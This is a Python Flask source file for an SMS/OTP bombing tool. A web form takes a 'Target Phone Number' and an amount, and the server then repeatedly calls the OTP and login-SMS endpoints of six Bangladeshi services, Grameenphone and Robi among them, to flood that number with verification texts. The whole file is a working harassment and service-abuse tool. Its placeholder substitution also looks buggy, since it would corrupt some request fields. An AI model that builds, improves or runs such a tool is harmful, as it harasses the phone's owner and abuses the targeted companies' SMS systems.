from flask import Flask, request, jsonify, render_template_string
import requests
import json
import time

app = Flask(__name__)

API_LIST = [
    {
        "name": "Robi Wifi",
        "url": "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Referer": "https://robiwifi.robi.com.bd/"},
        "data": {"login": "p"}
    },
    {
        "name": "GP Web",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": {"msisdn": "p"}
    },
    {
        "name": "Shikho",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "origin": "https://shikho.com", "referer": "https://shikho.com/"},
        "data": {"phone": "880p", "type": "student", "auth_type": "login", "vendor": "shikho"}
    },
    {
        "name": "Chorki",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": {"number": "+880p"}
    },
    {
        "name": "Bikroy",
        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login",
        "method": "GET",
        "params": {"phone": "p"}
    },
    {
        "name": "Bohubrihi",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": {"phone": "p", "intent": "login"}
    }
]

# ড্যাশবোর্ড HTML (Bootstrap + WordPress Style)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tnayem48 - API Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { background-color: #f4f7f6; font-family: 'Poppins', sans-serif; }
        .card { border: none; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .btn-primary { background: linear-gradient(45deg, #007bff, #0056b3); border: none; }
        .header { background: #fff; padding: 20px; text-align: center; border-bottom: 3px solid #007bff; margin-bottom: 30px; }
    </style>
</head>
<body>
    <div class="header"><h2>🚀 Tnayem48 API Handler</h2></div>
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card p-4">
                    <div class="mb-3">
                        <label class="form-label">Target Phone Number</label>
                        <input type="text" id="num" class="form-control" placeholder="01712345678">
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Amount</label>
                        <input type="number" id="amount" class="form-control" value="1" min="1" max="20">
                    </div>
                    <button onclick="sendRequests()" id="btn" class="btn btn-primary w-100 py-2">Send Requests</button>
                    <div id="result" class="mt-4 text-center"></div>
                </div>
            </div>
        </div>
    </div>
    <script>
        async function sendRequests() {
            const num = document.getElementById('num').value;
            const amount = document.getElementById('amount').value;
            const btn = document.getElementById('btn');
            const result = document.getElementById('result');

            if(!num) return alert("Number please!");
            
            btn.disabled = true;
            btn.innerText = "Processing...";
            result.innerHTML = '<div class="spinner-border text-primary" role="status"></div>';

            try {
                const response = await fetch(`/api?num=${num}&amount=${amount}`);
                const data = await response.json();
                result.innerHTML = `<div class="alert ${data.status === 'success' ? 'alert-success' : 'alert-danger'}">${data.message}</div>`;
            } catch (error) {
                result.innerHTML = '<div class="alert alert-danger">try again later with a small amount.</div>';
            }
            btn.disabled = false;
            btn.innerText = "Send Requests";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api')
def handle_api():
    num = request.args.get('num', '')
    amount = request.args.get('amount', default=1, type=int)

    if not num or len(num) < 10:
        return jsonify({"status": "error", "message": "Invalid Number"}), 400

    # নম্বর ফরম্যাটিং
    clean_num = num[-10:] # 17xxxxxxxx
    full_num = "0" + clean_num if len(clean_num) == 10 else num
    
    success_count = 0
    
    for _ in range(amount):
        for api in API_LIST:
            try:
                # ডাইনামিক রিপ্লেসমেন্ট
                headers = api.get("headers", {})
                
                if api["method"] == "POST":
                    raw_data = json.dumps(api["data"])
                    # p, 880p, +880p হ্যান্ডলিং
                    processed_data = raw_data.replace("880p", "880" + clean_num).replace("+880p", "+880" + clean_num).replace("p", full_num)
                    response = requests.post(api["url"], json=json.loads(processed_data), headers=headers, timeout=5)
                else:
                    raw_params = json.dumps(api["params"])
                    processed_params = raw_params.replace("p", full_num)
                    response = requests.get(api["url"], params=json.loads(processed_params), headers=headers, timeout=5)
                
                if response.status_code == 200:
                    success_count += 1
            except:
                continue
        time.sleep(1)

    return jsonify({
        "status": "success",
        "message": f"successfully sent by Tnayem48. Total requests sent: {success_count}"
    })

if __name__ == '__main__':
    app.run(debug=True)
